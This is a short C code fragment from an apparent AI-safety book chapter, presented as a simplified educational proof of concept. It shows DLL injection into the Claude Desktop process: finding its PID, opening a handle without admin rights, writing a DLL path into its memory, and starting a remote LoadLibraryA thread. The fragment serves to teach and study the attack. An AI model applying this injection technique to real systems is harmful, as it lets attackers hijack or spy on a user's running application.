// Extracted from: LibroAISafety/ch-21-case-claude-desktop.md
// Simplified fragment of the injection PoC
// (educational -- omits error handling and helper functions)

// 1. Find the Claude Desktop PID
DWORD pid = FindProcessByName("Claude.exe");

// 2. Open handle to the process (does not require admin)
HANDLE hProc = OpenProcess(
    PROCESS_CREATE_THREAD | PROCESS_VM_WRITE | PROCESS_VM_OPERATION,
    FALSE, pid
);

// 3. Write the path of our DLL into the process
LPVOID remotePath = VirtualAllocEx(hProc, NULL, pathLen, ...);
WriteProcessMemory(hProc, remotePath, dllPath, pathLen, NULL);

// 4. Create remote thread that loads our DLL
CreateRemoteThread(hProc, NULL, 0,
    (LPTHREAD_START_ROUTINE)GetProcAddress(
        GetModuleHandle("kernel32"), "LoadLibraryA"),
    remotePath, 0, NULL);
